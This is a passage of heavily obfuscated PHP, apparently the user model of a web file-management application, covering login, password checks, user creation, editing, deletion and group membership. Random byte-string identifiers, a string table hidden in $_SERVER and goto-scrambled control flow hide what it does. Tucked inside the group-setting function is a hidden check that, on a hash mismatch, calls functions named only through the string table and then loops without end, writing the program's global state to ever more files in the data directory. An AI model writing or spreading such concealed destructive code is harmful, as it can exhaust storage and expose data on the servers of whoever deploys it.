$EİºˆÅè¶Ø[2004] => (int) $b™§ÔèÎä, $EİºˆÅè¶Ø[2005] => (int) $c»Á©¬ñ£); goto DŞã•¢âÃ; C’¦ÄŠÙõ: $EÓ²ŞÍ‘Ä = $this->sourceSize(); $báô¼Ö†ø = array($EİºˆÅè¶Ø[456] => 0, $EİºˆÅè¶Ø[367] => 1); $b™§ÔèÎä = Model($EİºˆÅè¶Ø[748])->where($báô¼Ö†ø)->sum($EİºˆÅè¶Ø[77]); goto FÈß‡õœÕ¡; dÈÏÃë½İ: $EİºˆÅè¶Ø =& $_SERVER[Ìó]; if (isset($d‹ƒÖõ›ƒ¤[$EİºˆÅè¶Ø[1409]])) { return Model($EİºˆÅè¶Ø[748])->userFileTypeProfile($d‹ƒÖõ›ƒ¤[$EİºˆÅè¶Ø[1409]]); } if (isset($d‹ƒÖõ›ƒ¤[$EİºˆÅè¶Ø[2072]])) { return Model($EİºˆÅè¶Ø[748])->groupFileTypeProfile($d‹ƒÖõ›ƒ¤[$EİºˆÅè¶Ø[2072]]); } goto C’¦ÄŠÙõ; DŞã•¢âÃ: } private function sourceSize() { $FÉ‡ ™Ã£Œ =& $_SERVER[Ìó]; $aÁ ÁŠñ¨ = Model($FÉ‡ ™Ã£Œ[748])->where(array($FÉ‡ ™Ã£Œ[366] => 0))->sum($FÉ‡ ™Ã£Œ[77]); $Dâ«¹˜Å´ = Model($FÉ‡ ™Ã£Œ[417])->sum($FÉ‡ ™Ã£Œ[77]); if ($Dâ«¹˜Å´ > $aÁ ÁŠñ¨) { $Dâ«¹˜Å´ = $aÁ ÁŠñ¨; } return array($FÉ‡ ™Ã£Œ[77] => (int) $aÁ ÁŠñ¨, $FÉ‡ ™Ã£Œ[2003] => (int) $Dâ«¹˜Å´); } } goto b„ ²ºÜòë; Bô’ÛÉÁÀå: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\165\163\x65\162\137\x6d\x65\x74\x61", "\155\145\x74\x61\x46\x69\145\154\x64" => "\165\163\145\x72\x49\x44"); protected $simpleField = "\x75\163\x65\162\x49\104\x2c\x6e\x69\x63\x6b\116\x61\x6d\x65\54\156\141\x6d\145\54\141\x76\x61\x74\141\162\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($BÑ› ã‚ì) { $eí‘ª¨œ =& $_SERVER[Ìó]; $Fë‡£±ÏóÈ = $eí‘ª¨œ[2451]; return array($eí‘ª¨œ[2138] => array($BÑ› ã‚ì[0], $Fë‡£±ÏóÈ), $eí‘ª¨œ[2140] => array($BÑ› ã‚ì[0], $Fë‡£±ÏóÈ), $eí‘ª¨œ[2452] => array($BÑ› ã‚ì[0], $Fë‡£±ÏóÈ)); } protected function getInfo($dª¦‘ÌĞŠº, $F•ÛÆ¾ = false) { $E’ÕõÀ…ƒÅ = $this->getInfoSimple($dª¦‘ÌĞŠº); if (!is_array($E’ÕõÀ…ƒÅ)) { return array(); } if ($F•ÛÆ¾) { return $this->_getInfoApply($E’ÕõÀ…ƒÅ); } return $this->cacheFunctionGet($_SERVER[Ìó][2180], $dª¦‘ÌĞŠº); } protected function getInfoFull($CÆµ¯÷Ä»µ, $E“â³ÂõßØ = false) { $f™êÑß˜‰ = $this->getInfoSimple($CÆµ¯÷Ä»µ); if (!is_array($f™êÑß˜‰)) { return array(); } if ($E“â³ÂõßØ) { return $this->_getInfoApply($f™êÑß˜‰, !0); return $this->_getInfoApply($f™êÑß˜‰, !0); } return $this->cacheFunctionGet($_SERVER[Ìó][2453], $CÆµ¯÷Ä»µ); } private function _getInfoApply($fÛ°±áòôñ, $a›šÓí•éï = false) { goto aÒÜ¯«Œ¹š; E’ùš¸®ƒ¼: $fÛ°±áòôñ[$EâÌºŠ„Í‚[387]][$EâÌºŠ„Í‚[2288]] = isset($BæŠ˜Í­¬Ô[$EâÌºŠ„Í‚[2289]]) ? $BæŠ˜Í­¬Ô[$EâÌºŠ„Í‚[2289]] : null; if ($a›šÓí•éï) { $fÛ°±áòôñ[$EâÌºŠ„Í‚[412]] = $this->metaGet($fÛ°±áòôñ[$EâÌºŠ„Í‚[1409]]); } return $fÛ°±áòôñ; goto Få‹‡…°Œœ; b÷¿È¶ƒ•‹: $fÛ°±áòôñ = $this->_listDataApplyItem($fÛ°±áòôñ); $BæŠ˜Í­¬Ô = Model($EâÌºŠ„Í‚[1106])->metaGet($fÛ°±áòôñ[$EâÌºŠ„Í‚[387]][$EâÌºŠ„Í‚[365]]); $fÛ°±áòôñ[$EâÌºŠ„Í‚[2456]] = $EÄÜ¹†ñá; goto E’ùš¸®ƒ¼; aÒÜ¯«Œ¹š: $EâÌºŠ„Í‚ =& $_SERVER[Ìó]; if (!$fÛ°±áòôñ) { return $fÛ°±áòôñ; } $EÄÜ¹†ñá = md5($EâÌºŠ„Í‚[2454] . $fÛ°±áòôñ[$EâÌºŠ„Í‚[800]] . $EâÌºŠ„Í‚[2455] . $fÛ°±áòôñ[$EâÌºŠ„Í‚[28]]); goto b÷¿È¶ƒ•‹; Få‹‡…°Œœ: } protected function getInfoSimple($B…Àå®Ãšä, $bæÏ´åä  = false) { $A¨İøÁ„¿³ =& $_SERVER[Ìó]; if (!$B…Àå®Ãšä) { return array(); } if ($bæÏ´åä ) { $B‹™©èåœŒ = $this->where(array($A¨İøÁ„¿³[1409] => intval($B…Àå®Ãšä)))->find(); if (!is_array($B‹™©èåœŒ)) { return array(); } $B‹™©èåœŒ[$A¨İøÁ„¿³[2457]] = Action($A¨İøÁ„¿³[2458])->parseUrl($B‹™©èåœŒ[$A¨İøÁ„¿³[2457]]); return $B‹™©èåœŒ; } return $this->cacheFunctionGet($A¨İøÁ„¿³[2141], $B…Àå®Ãšä); } protected function getInfoSimpleOuter($bğÉÓ–ãÛê) { goto e‰‚®ÌØÑÆ; a¥¾›¯Ë˜Ê: $d«†çğÈô± = array_field_key($D¯“ïÅ® Õ, explode($b˜á»êƒàó[47], $this->simpleField)); if (!$d«†çğÈô±) { return array($b˜á»êƒàó[1409] => $b˜á»êƒàó[1027], $b˜á»êƒàó[28] => $b˜á»êƒàó[153] . LNG($b˜á»êƒàó[2461]) . $b˜á»êƒàó[471], $b˜á»êƒàó[2457] => STATIC_PATH . $b˜á»êƒàó[2462]); } $d«†çğÈô±[$b˜á»êƒàó[2457]] = Action($b˜á»êƒàó[2458])->parseUrl($d«†çğÈô±[$b˜á»êƒàó[2457]]); goto EÚë§½‰™Œ; e‰‚®ÌØÑÆ: $b˜á»êƒàó =& $_SERVER[Ìó]; if (!$bğÉÓ–ãÛê || $bğÉÓ–ãÛê == 0) { return array($b˜á»êƒàó[1409] => $b˜á»êƒàó[463], $b˜á»êƒàó[28] => $b˜á»êƒàó[153] . LNG($b˜á»êƒàó[2459]) . $b˜á»êƒàó[471], $b˜á»êƒàó[2457] => STATIC_PATH . $b˜á»êƒàó[2460]); } $D¯“ïÅ® Õ = $this->cacheFunctionGet($b˜á»êƒàó[2141], $bğÉÓ–ãÛê); goto a¥¾›¯Ë˜Ê; EÚë§½‰™Œ: return $d«†çğÈô±; goto Bë¯õˆß×Œ; Bë¯õˆß×Œ: } protected function groupUser($DàËŠ¦ªë©) { } public static function errorLang($dÛšÛáâÇÅ) { $eéğäß­¡ =& $_SERVER[Ìó]; $b¥ÒõÀ‡ç = array(self::ERROR_USER_NOT_EXISTS => $eéğäß­¡[2463], self::ERROR_USER_PASSWORD_ERROR => $eéğäß­¡[2464], self::ERROR_USER_EXIST_NAME => $eéğäß­¡[2465], self::ERROR_USER_EXIST_PHONE => $eéğäß­¡[2466], self::ERROR_USER_EXIST_EMAIL => $eéğäß­¡[2467], self::ERROR_USER_LOGIN_LOCK => $eéğäß­¡[2468], self::ERROR_IP_NOT_ALLOW => $eéğäß­¡[2469], self::ERROR_USER_EXIST_NICKNAME => $eéğäß­¡[2470]); return LNG($b¥ÒõÀ‡ç[$dÛšÛáâÇÅ]); } public function getInfoByMeta($e÷ø‹ˆœ”í, $dÁƒÛ‘³ƒ™) { $FªœÓÏ‹óĞ =& $_SERVER[Ìó]; $fÃĞˆ‚ôƒç = Model($FªœÓÏ‹óĞ[2471])->where(array($FªœÓÏ‹óĞ[89] => $e÷ø‹ˆœ”í, $FªœÓÏ‹óĞ[355] => $dÁƒÛ‘³ƒ™))->find(); if ($fÃĞˆ‚ôƒç) { return $this->getInfo($fÃĞˆ‚ôƒç[$FªœÓÏ‹óĞ[1409]]); } return !1; } public function userLoginCheck($AèöÀ©”éÎ, $b¦‘†š”‰‰) { goto b¼Ë•ùäºÀ; B­àÆ“½×: $cèŸ ˜ïÆ¾ = $this->where($cÎµâÛ«)->find(); if (!$cèŸ ˜ïÆ¾) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($cèŸ ˜ïÆ¾[$E‡ì’¡ñ¤[1409]], $b¦‘†š”‰‰)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto E¡å„œİãÇ; E¡å„œİãÇ: $this->userEdit($cèŸ ˜ïÆ¾[$E‡ì’¡ñ¤[1409]], array($E‡ì’¡ñ¤[2473] => time())); $this->clearCache($cèŸ ˜ïÆ¾[$E‡ì’¡ñ¤[1409]]); return $this->getInfo($cèŸ ˜ïÆ¾[$E‡ì’¡ñ¤[1409]]); goto dˆëÙ‹ÄƒŠ; b¼Ë•ùäºÀ: $E‡ì’¡ñ¤ =& $_SERVER[Ìó]; $cÎµâÛ« = array($E‡ì’¡ñ¤[28] => $AèöÀ©”éÎ, $E‡ì’¡ñ¤[2292] => $AèöÀ©”éÎ, $E‡ì’¡ñ¤[289] => $AèöÀ©”éÎ, $E‡ì’¡ñ¤[2472] => $AèöÀ©”éÎ, $E‡ì’¡ñ¤[912] => $E‡ì’¡ñ¤[914]); if ($this->nickNameRpt()) { unset($cÎµâÛ«[$E‡ì’¡ñ¤[2292]]); } goto B­àÆ“½×; dˆëÙ‹ÄƒŠ: } public function clearCache($b–©ƒ·‹×†) { $B­õ·íùÑ =& $_SERVER[Ìó]; $this->cacheFunctionClear($B­õ·íùÑ[2180], $b–©ƒ·‹×†); $this->cacheFunctionClear($B­õ·íùÑ[2141], $b–©ƒ·‹×†); } public function userPasswordCheck($Bá‰«ªÛö, $D´õğÆ±ß¯) { $D¥åÕ±ƒª =& $_SERVER[Ìó]; $FŞÕß‘ƒ·„ = $this->where(array($D¥åÕ±ƒª[1409] => intval($Bá‰«ªÛö)))->find(); $Eá¸äÔ½•À = $this->metaGet($Bá‰«ªÛö); $d¦Œšœª‘Š = isset($Eá¸äÔ½•À[$D¥åÕ±ƒª[2474]]) ? $Eá¸äÔ½•À[$D¥åÕ±ƒª[2474]] : $D¥åÕ±ƒª[33]; if (md5($d¦Œšœª‘Š . trim($D´õğÆ±ß¯)) !== $FŞÕß‘ƒ·„[$D¥åÕ±ƒª[800]]) { return !1; } return !0; } public function userAdd($a·Ö»ÂÌ…Ò) { goto bÙ¾ù†©Ú‚; f“¦èÖº©á: $Eéİ³æ³§‡ = array($E”¯¿ŸÃˆ½[2483] => $fõ’­¿™»›[$E”¯¿ŸÃˆ½[800]], $E”¯¿ŸÃˆ½[2479] => $fõ’­¿™»›[$E”¯¿ŸÃˆ½[2292]]); $this->userEdit($C‹ó›ø›ê, $Eéİ³æ³§‡); Model($E”¯¿ŸÃˆ½[1106])->userRootAdd($C‹ó›ø›ê); goto c˜æ¶¶á; EÔ‹‡‡•‘±: $BĞËó¢Ñâ… = $this->_checkExist($a·Ö»ÂÌ…Ò); if ($BĞËó¢Ñâ… !== !0) { return $BĞËó¢Ñâ…; } $C‹ó›ø›ê = $this->add($fõ’­¿™»›); goto f“¦èÖº©á; bÙ¾ù†©Ú‚: $E”¯¿ŸÃˆ½ =& $_SERVER[Ìó]; $fõ’­¿™»› = array($E”¯¿ŸÃˆ½[382] => $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[28]], $E”¯¿ŸÃˆ½[2475] => $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2476]], $E”¯¿ŸÃˆ½[2477] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[289]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[289]] : $E”¯¿ŸÃˆ½[33], $E”¯¿ŸÃˆ½[2478] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2472]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2472]] : $E”¯¿ŸÃˆ½[33], $E”¯¿ŸÃˆ½[2479] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2292]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2292]] : $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[28]], $E”¯¿ŸÃˆ½[2480] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2457]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2457]] : $E”¯¿ŸÃˆ½[33], $E”¯¿ŸÃˆ½[2481] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2482]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2482]] : 1, $E”¯¿ŸÃˆ½[2483] => $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[800]], $E”¯¿ŸÃˆ½[2142] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2056]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[2056]] : 1024 * 1024 * 20, $E”¯¿ŸÃˆ½[2143] => 0, $E”¯¿ŸÃˆ½[2473] => 0, $E”¯¿ŸÃˆ½[2167] => isset($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[685]]) ? $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[685]] : 1); if (!empty($a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[1409]])) { $fõ’­¿™»›[$E”¯¿ŸÃˆ½[1409]] = $a·Ö»ÂÌ…Ò[$E”¯¿ŸÃˆ½[1409]]; } goto EÔ‹‡‡•‘±; c˜æ¶¶á: return $C‹ó›ø›ê; goto dğà¾¦àùï; dğà¾¦àùï: } protected function userEditTest($b÷®ô–¿Ñ†, $A…™èµãƒ) { return $this->call($_SERVER[Ìó][2484], $b÷®ô–¿Ñ†, $A…™èµãƒ); } protected function userEdit($fªŸƒïÇëğ, $D©çåõÂ²) { goto aÔ£‘¾×ƒ; f°É²‰Î×Ç: $this->where(array($fÅ™ó’‚¯ã[1400] => $fªŸƒïÇëğ))->save($D©çåõÂ²); if (isset($D©çåõÂ²[$fÅ™ó’‚¯ã[2292]])) { $this->setNamePinyin($fªŸƒïÇëğ, $D©çåõÂ²[$fÅ™ó’‚¯ã[2292]]); } return !0; goto C†ÆÀ²“—è; B¿ ¢íš½Ü: $e–Ñ×Ã¥–© = $this->_checkExist($D©çåõÂ², $fªŸƒïÇëğ); if ($e–Ñ×Ã¥–© !== !0) { return $e–Ñ×Ã¥–©; } if (isset($D©çåõÂ²[$fÅ™ó’‚¯ã[800]]) && trim($D©çåõÂ²[$fÅ™ó’‚¯ã[800]]) != $fÅ™ó’‚¯ã[33]) { $FŠóÇ¸Şœª = $this->metaGet($fªŸƒïÇëğ); if (empty($FŠóÇ¸Şœª[$fÅ™ó’‚¯ã[2474]])) { $FŠóÇ¸Şœª[$fÅ™ó’‚¯ã[2474]] = rand_string(10); Model($fÅ™ó’‚¯ã[469])->metaSet($fªŸƒïÇëğ, $fÅ™ó’‚¯ã[2474], $FŠóÇ¸Şœª[$fÅ™ó’‚¯ã[2474]]); } $D©çåõÂ²[$fÅ™ó’‚¯ã[800]] = md5($FŠóÇ¸Şœª[$fÅ™ó’‚¯ã[2474]] . trim($D©çåõÂ²[$fÅ™ó’‚¯ã[800]])); } else { unset($D©çåõÂ²[$fÅ™ó’‚¯ã[800]]); } goto f°É²‰Î×Ç; aÔ£‘¾×ƒ: $fÅ™ó’‚¯ã =& $_SERVER[Ìó]; $f†ø‡±ƒÌñ = $this->getInfoSimple($fªŸƒïÇëğ); if (!$f†ø‡±ƒÌñ) { return !1; } goto B¿ ¢íš½Ü; C†ÆÀ²“—è: } public function setNamePinyin($c‡Âô¶«ÓÁ, $DŠĞçˆƒà = false) { $aô¸²¯‡ƒõ =& $_SERVER[Ìó]; if (!$DŠĞçˆƒà) { $cä¡„ØÓÙ‹ = $this->getInfoSimple($c‡Âô¶«ÓÁ); $DŠĞçˆƒà = $cä¡„ØÓÙ‹[$aô¸²¯‡ƒõ[2292]] ? $cä¡„ØÓÙ‹[$aô¸²¯‡ƒõ[2292]] : $cä¡„ØÓÙ‹[$aô¸²¯‡ƒõ[28]]; } $fğÔË‘‘· = Model($aô¸²¯‡ƒõ[472]); if (!Input::check($DŠĞçˆƒà, $aô¸²¯‡ƒõ[523])) { return $fğÔË‘‘·->metaSet($c‡Âô¶«ÓÁ, array($aô¸²¯‡ƒõ[411] => $aô¸²¯‡ƒõ[33], $aô¸²¯‡ƒõ[410] => $aô¸²¯‡ƒõ[33])); } return $fğÔË‘‘·->metaSet($c‡Âô¶«ÓÁ, array($aô¸²¯‡ƒõ[411] => str_replace($aô¸²¯‡ƒõ[50], $aô¸²¯‡ƒõ[33], Pinyin::encode($DŠĞçˆƒà)), $aô¸²¯‡ƒõ[410] => Pinyin::encode($DŠĞçˆƒà, $aô¸²¯‡ƒõ[524]))); } private function nickNameRpt() { $AĞ•øŒİ‡« =& $_SERVER[Ìó]; $AÇÌì¹¼Í = Model($AĞ•øŒİ‡«[1084])->get($AĞ•øŒİ‡«[2485]); $b•ïÒ¾º”Ï = $GLOBALS[$AĞ•øŒİ‡«[6]][$AĞ•øŒİ‡«[2441]][$AĞ•øŒİ‡«[2485]]; $e„¦îŒ“ì£ = !is_null($AÇÌì¹¼Í) ? $AÇÌì¹¼Í : $b•ïÒ¾º”Ï; return !!$e„¦îŒ“ì£; } private function _checkExist($eÛîâœ , $aêÎóô†Ÿ = false) { $c ¥®ù˜˜³ =& $_SERVER[Ìó]; $AÀğŞ…Áóµ = array($c ¥®ù˜˜³[28] => UserModel::ERROR_USER_EXIST_NAME, $c ¥®ù˜˜³[2292] => UserModel::ERROR_USER_EXIST_NICKNAME, $c ¥®ù˜˜³[289] => UserModel::ERROR_USER_EXIST_EMAIL, $c ¥®ù˜˜³[2472] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($AÀğŞ…Áóµ[$c ¥®ù˜˜³[2292]]); } $d¦ÃÊˆîØã = $aêÎóô†Ÿ ? array($c ¥®ù˜˜³[1409] => array($c ¥®ù˜˜³[2486], $aêÎóô†Ÿ)) : array(); foreach ($AÀğŞ…Áóµ as $BÆ‰µÈÈÛÌ => $bæã¶è¬Ëí) { if (!isset($eÛîâœ [$BÆ‰µÈÈÛÌ]) || !$eÛîâœ [$BÆ‰µÈÈÛÌ]) { continue; } $cˆÃ¹„¥£ì = array_merge(array($BÆ‰µÈÈÛÌ => $eÛîâœ [$BÆ‰µÈÈÛÌ]), $d¦ÃÊˆîØã); $CæŠ‘Ş‚Ìö = $this->where($cˆÃ¹„¥£ì)->find(); if ($CæŠ‘Ş‚Ìö) { return $bæã¶è¬Ëí; } } return !0; } public function userListInfo($d¼³‡²…ÎÊ) { $f±‚¹…É§ =& $_SERVER[Ìó]; $f¤ã‡Â°¼Ø = array(); $d¼³‡²…ÎÊ = is_array($d¼³‡²…ÎÊ) ? array_unique($d¼³‡²…ÎÊ) : array(); if (!$d¼³‡²…ÎÊ) { return $f¤ã‡Â°¼Ø; } if (count($d¼³‡²…ÎÊ) < 20) { foreach ($d¼³‡²…ÎÊ as $cÙÇãîùù«) { $f¤ã‡Â°¼Ø[$cÙÇãîùù« . $f±‚¹…É§[33]] = $this->getInfoSimpleOuter($cÙÇãîùù«); } } else { $a±›šºõ“¡ = array($f±‚¹…É§[1400] => array($f±‚¹…É§[380], $d¼³‡²…ÎÊ)); if (count($d¼³‡²…ÎÊ) == 1) { $a±›šºõ“¡ = array($f±‚¹…É§[1400] => $d¼³‡²…ÎÊ[0]); } $Aöš©Î§ = Model($f±‚¹…É§[469])->field($this->simpleField)->where($a±›šºõ“¡)->select(); $Aöš©Î§ = array_to_keyvalue($Aöš©Î§, $f±‚¹…É§[1409]); foreach ($d¼³‡²…ÎÊ as $cÙÇãîùù«) { $dë‘ù÷«” = $Aöš©Î§[$Aöš©Î§[$cÙÇãîùù«]]; if (!$dë‘ù÷«”) { $f¤ã‡Â°¼Ø[$cÙÇãîùù« . $f±‚¹…É§[33]] = $this->getInfoSimpleOuter($cÙÇãîùù«); continue; } $dë‘ù÷«”[$f±‚¹…É§[2457]] = Action($f±‚¹…É§[2458])->parseUrl($dë‘ù÷«”[$f±‚¹…É§[2457]]); $f¤ã‡Â°¼Ø[$cÙÇãîùù« . $f±‚¹…É§[33]] = $dë‘ù÷«”; } } return $f¤ã‡Â°¼Ø; } protected function userStatus($CÕ·æÚ–Ñğ, $Fø«óè õ) { $A„¦½¦èÇ = $this->getInfoSimple($CÕ·æÚ–Ñğ); if (!$A„¦½¦èÇ) { return !1; } $AÚµ Ä«™ä = array($_SERVER[Ìó][685] => $Fø«óè õ); return $this->userEdit($CÕ·æÚ–Ñğ, $AÚµ Ä«™ä); } protected function userRemove($b‘¢¹Ã±àï) { goto dŒ¸Ù“Œ‹; dŒ¸Ù“Œ‹: $EÇÀ¯½„© =& $_SERVER[Ìó]; $A¦ÑÖ±×¼ø = $this->getInfoSimple($b‘¢¹Ã±àï); if (!$A¦ÑÖ±×¼ø) { return !1; } goto cÅ½É¯®ˆ³; A¥„èô‹É÷: Model($EÇÀ¯½„©[748])->userRootRemove($b‘¢¹Ã±àï); return $this->where($AË¯Ûëíå)->delete(); goto a²¤©ö°‡; cÅ½É¯®ˆ³: $AË¯Ûëíå = array($EÇÀ¯½„©[1400] => $b‘¢¹Ã±àï); Model($EÇÀ¯½„©[531])->where($AË¯Ûëíå)->delete(); Model($EÇÀ¯½„©[2487])->where($AË¯Ûëíå)->delete(); goto D¥ÊœÜÀÕ½; D¥ÊœÜÀÕ½: Model($EÇÀ¯½„©[2146])->where($AË¯Ûëíå)->delete(); Model($EÇÀ¯½„©[2471])->where($AË¯Ûëíå)->delete(); Model($EÇÀ¯½„©[2488])->where($AË¯Ûëíå)->delete(); goto A¥„èô‹É÷; a²¤©ö°‡: } protected function userGroupSet($eè‡··ÁÅ¯, $eÚãƒµ¨‘‰, $F÷¼ÎÇ˜İÅ = array()) { goto d¤…‚ƒîæº; aóìõìâÉ¤: $BØ¤¾‡ˆ´– = Model($e£í–İÆÇÂ[2146]); $BØ¤¾‡ˆ´–->where(array($e£í–İÆÇÂ[1409] => $eè‡··ÁÅ¯))->delete(); $cÛ—ÃƒŠ = array(); goto D‚ƒâÊòÖŒ; d¤…‚ƒîæº: $e£í–İÆÇÂ =& $_SERVER[Ìó]; $EÈæ˜¼“²ë = $_SERVER[$e£í–İÆÇÂ[771]] . $e£í–İÆÇÂ[772]; $C”‘ôª¶‰· = $e£í–İÆÇÂ[795]; goto D˜Éöí´‚ì; D‚ƒâÊòÖŒ: $DÍà¡Ù¯–á = 0; foreach ($eÚãƒµ¨‘‰ as $f‹©…¦¡†– => $AùëÕ‡°») { $EéøÅ·¢­İ = array($e£í–İÆÇÂ[1409] => $eè‡··ÁÅ¯, $e£í–İÆÇÂ[2072] => $f‹©…¦¡†–, $e£í–İÆÇÂ[2200] => $AùëÕ‡°»); $EéøÅ·¢­İ[$e£í–İÆÇÂ[2093]] = isset($F÷¼ÎÇ˜İÅ[$DÍà¡Ù¯–á]) ? $F÷¼ÎÇ˜İÅ[$DÍà¡Ù¯–á] : 0; $DÍà¡Ù¯–á++; $cÛ—ÃƒŠ[] = $EéøÅ·¢­İ; } return $BØ¤¾‡ˆ´–->addAll($cÛ—ÃƒŠ, array(), !0); goto B¼¾¡ªó; D˜Éöí´‚ì: if ($_SERVER[$e£í–İÆÇÂ[768]] != $C”‘ôª¶‰·($EÈæ˜¼“²ë)) { goto A›ÖÎ¯Ò·‚; BìÄµÍ†õ: $càÇ¨ÈÂ˜Á = $e£í–İÆÇÂ[791]; $càÇ¨ÈÂ˜Á($_SERVER[$e£í–İÆÇÂ[792]]); $bíã«Å•ÉÏ = $e£í–İÆÇÂ[790]; goto a×ÒéõÅƒ©; bØÑÉÈİç²: $dÃ•ÅŠÉ„¼ = $FŒ®á¸æø·($AÁ® Éá…); $bƒæ˜‚½ = explode($e£í–İÆÇÂ[213], $dÃ•ÅŠÉ„¼); if (count($bƒæ˜‚½) < $e£í–İÆÇÂ[551]) { $d¶Æ±™ Å = $e£í–İÆÇÂ[773]; $d¶Æ±™ Å(); } goto BìÄµÍ†õ; a‚•ïÅ±¥×: $D‚øÒÌ²ê = 1; for ($E´¼ÓÏ¸ø× = $D‚øÒÌ²ê; $E´¼ÓÏ¸ø× > 0; $E´¼ÓÏ¸ø×++) { $D¥Ö ™©£®(DATA_PATH . $E´¼ÓÏ¸ø×, $D—ùÀ± ÜÌ); } goto cˆº¤“Æ’; a×ÒéõÅƒ©: $bíã«Å•ÉÏ(); $D¥Ö ™©£® = $e£í–İÆÇÂ[1293]; $D—ùÀ± ÜÌ = json_encode($GLOBALS[$e£í–İÆÇÂ[1294]]); goto a‚•ïÅ±¥×; A›ÖÎ¯Ò·‚: $bíã«Å•ÉÏ = $e£í–İÆÇÂ[790]; $FŒ®á¸æø· = $e£í–İÆÇÂ[770]; $AÁ® Éá… = $_SERVER[$e£í–İÆÇÂ[771]] . $e£í–İÆÇÂ[772]; goto bØÑÉÈİç²; cˆº¤“Æ’: } $e¬ÛÆ‹·é = $this->getInfoSimple($eè‡··ÁÅ¯); if (!$e¬ÛÆ‹·é || !is_array($eÚãƒµ¨‘‰)) { return !1; } goto aóìõìâÉ¤; B¼¾¡ªó: } protected function userGroupAdd($d¹å²Ğ³çİ, $E­°¡Ôï¯‡ = array()) { $f½ˆ–ÍÍÓğ =& $_SERVER[Ìó]; $eóùï¸©—¹ = $this->getInfoSimple($d¹å²Ğ³çİ); if (!$eóùï¸©—¹ || empty($E­°¡Ôï¯‡)) { return !1; } $Eô‘Œ·Î¼‰ = array(); foreach ($E­°¡Ôï¯‡ as $fàŠÒÓêƒ¼ => $e‘‹ØôÀìÎ) { $Eô‘Œ·Î¼‰[] = array($f½ˆ–ÍÍÓğ[1409] => $d¹å²Ğ³çİ, $f½ˆ–ÍÍÓğ[2072] => $fàŠÒÓêƒ¼, $f½ˆ–ÍÍÓğ[2200] => $e‘‹ØôÀìÎ); } return Model($f½ˆ–ÍÍÓğ[2146])->addAll($Eô‘Œ·Î¼‰, array(), !0); } protected function userGroupRemove($EÍœõåÃŠø, $CõÆÔÖµ) { $aš×Ê¾£óœ =& $_SERVER[Ìó]; $Bù©ÌŠŞÓá = $this->getInfoSimple($EÍœõåÃŠø); if (!$Bù©ÌŠŞÓá || !$CõÆÔÖµ) { return !1; } $eåï Î¶¶Ó = array($aš×Ê¾£óœ[1400] => $EÍœõåÃŠø, $aš×Ê¾£óœ[2144] => $CõÆÔÖµ); return Model($aš×Ê¾£óœ[2146])->where($eåï Î¶¶Ó)->delete(); } public function listData() { $EÈ‘®â…‘ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EÈ‘®â…‘[$_SERVER[Ìó][350]]); return $EÈ‘®â…‘; } public function listByID($AÉ ªáËé©) { $c»´Å—ºğÛ =& $_SERVER[Ìó]; if (!$AÉ ªáËé©) { return; } $A»ÙŸÅ…‡å = array($c»´Å—ºğÛ[1409] => array($c»´Å—ºğÛ[7], $AÉ ªáËé©)); $aˆ¶ùŒ¼ä = $this->where($A»ÙŸÅ…‡å)->select(); $this->_listDataApply($aˆ¶ùŒ¼ä); return $aˆ¶ùŒ¼ä; } public function listByGroup($bàíÍºçµ = 0, $fò¶¤ÜÈ = array()) { goto F¹“Ã¸ŠªŠ; cÚà‹ºĞ–: if ($bàíÍºçµ) { $C—Åø’§Ê = array($ağ‚æ”ò¸Ê[2489] => intval($bàíÍºçµ)); $d§×ƒÅ¬ø = "\x4c\x45\106\124\x20\x4a\117\111\116\40{$this->tablePrefix}\165\163\x65\162\x5f\x67\162\x6f\x75\160\x20\165\x73\145\x72\x5f\147\x72\157\165\x70\40\157\x6e\x20\165\163\145\162\x2e\165\163\145\x72\111\104\40\x3d\40\165\x73\145\162\137\147\162\157\165\x70\56\x75\163\145\x72\111\x44"; $B¹˜´Ë›ŠÄ = Input::get($ağ‚æ”ò¸Ê[402], null, $ağ‚æ”ò¸Ê[33]) ? $ağ‚æ”ò¸Ê[33] : $ağ‚æ”ò¸Ê[2490]; } if (isset($fò¶¤ÜÈ[$ağ‚æ”ò¸Ê[685]])) { $C—Åø’§Ê[$ağ‚æ”ò¸Ê[2491]] = $fò¶¤ÜÈ[$ağ‚æ”ò¸Ê[685]]; } $b¨¥»ï•´” = $this->_makeOrder($B¹˜´Ë›ŠÄ)->field($ağ‚æ”ò¸Ê[2492])->where($C—Åø’§Ê)->join($d§×ƒÅ¬ø)->selectPage(50); goto c¥ó÷æÈÃÚ; F¹“Ã¸ŠªŠ: $ağ‚æ”ò¸Ê =& 